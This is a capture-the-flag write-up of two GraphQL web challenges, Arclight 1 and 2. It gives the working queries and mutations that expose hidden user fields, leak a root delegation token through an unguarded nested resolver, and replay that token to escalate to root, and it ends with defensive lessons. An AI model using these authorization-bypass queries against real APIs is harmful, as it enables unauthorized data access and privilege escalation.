# KPMG CTF 2026: Arclight 1 & 2 — GraphQL Authorization Writeup

This document details solutions for both **Arclight - 1** and **Arclight - 2** challenges from KPMG CTF 2026 Campus Edition.

---

## Challenge 1: Arclight - 1

### Challenge Information

| Field | Details |
| :--- | :--- |
| **Challenge Name** | Arclight - 1 |
| **Category** | Web Exploitation / GraphQL API Security |
| **Vulnerability Class** | Excessive Data Exposure / Broken Object Property Level Authorization |

### Objective
The web application provides a staff directory portal, but the user interface restricts displayed fields to a minimal profile summary. The goal was to audit the underlying GraphQL API to identify unexposed object properties.

### Discovery & Exploitation
1. Registered an unprivileged user account and logged in.
2. Navigated to the **Console** section in the dashboard and observed network requests targeting `/graphql`.
3. Executed baseline query:
   ```graphql
   { 
     users { 
       id 
       username 
       email 
     } 
   }
   ```
   This returned five user records.
4. Although introspection was restricted, field probing on the `User` type revealed additional attributes:
   ```graphql
   { users { role } }
   { users { flag } }
   { users { password } }  # Rejected as unknown
   ```
5. Queried the exposed administrative properties:
   ```graphql
   { 
     users { 
       id 
       username 
       role 
       flag 
     } 
   }
   ```
6. The administrative record (user ID 1) returned an active administrator role along with the populated secret flag in the `flag` field.

### Vulnerability Analysis
The backend resolver returned full entity attributes regardless of caller role, relying on the frontend query definition to filter sensitive fields.

---

## Challenge 2: Arclight - 2

### Challenge Information

| Field | Details |
| :--- | :--- |
| **Challenge Name** | Arclight - 2 |
| **Category** | Web Exploitation / Nested Resolver BOLA & PrivEsc |
| **Vulnerability Class** | Broken Object Level Authorization (BOLA) & Function-Level Authorization |

### Objective
The upgraded application enforces tiered access control. An unprivileged caller must elevate privileges to `root` before querying the protected `{ rootVault }`.

### Initial Foothold & Access Request
1. Verified current user privileges:
   ```graphql
   { me { username role } }
   ```
   Account status: `standard`.
2. Probing `{ rootVault }` failed with `root-access-required`.
3. Initiated a root access request:
   ```graphql
   mutation {
     createAccessRequest(tier: "root") {
       id
       requester
       tier
       status
     }
   }
   ```
   Request created with status `pending`.

### Nested Resolver BOLA Discovery
Directly invoking `delegation(id: ...)` was blocked by an ownership verification check. However, exploring relational navigation paths through the `Staff` type bypassed this check:

```graphql
{
  staff(id: 1) {
    id
    username
    delegations {
      id
      owner
      tier
      token
    }
  }
}
```

The nested resolver returned the privileged delegation object for staff member 1, exposing a valid `root`-tier delegation token.

### Privilege Escalation & Flag Retrieval
The `approveRequest` mutation validated that the provided `sponsor` token had root privileges, but failed to verify whether the caller was the legitimate owner of that token:

```graphql
mutation {
  approveRequest(id: REQUEST_ID, sponsor: "LEAKED_ROOT_TOKEN") {
    id
    status
  }
}
```

The request status changed to `approved`. Re-checking account permissions:

```graphql
{ me { username role } }
# role: root
```

Querying the root vault:

```graphql
{ rootVault }
```

The server accepted the elevated role and released the challenge flag.

---

## Key Takeaways
1. **The Frontend is Not a Security Boundary:** Relying on UI query templates to hide sensitive fields (Excessive Data Exposure) fails against direct API interaction.
2. **Consistent Authorization on Nested Resolvers:** Authorization checks placed on top-level query resolvers (e.g. `query { delegation }`) must be enforced recursively when the same data type is accessed via nested associations (`staff -> delegations`).
3. **Bind Privileged Tokens to Callers:** Verifying that a sponsor token is valid is insufficient; the authorization engine must verify that the active session is entitled to wield that token.
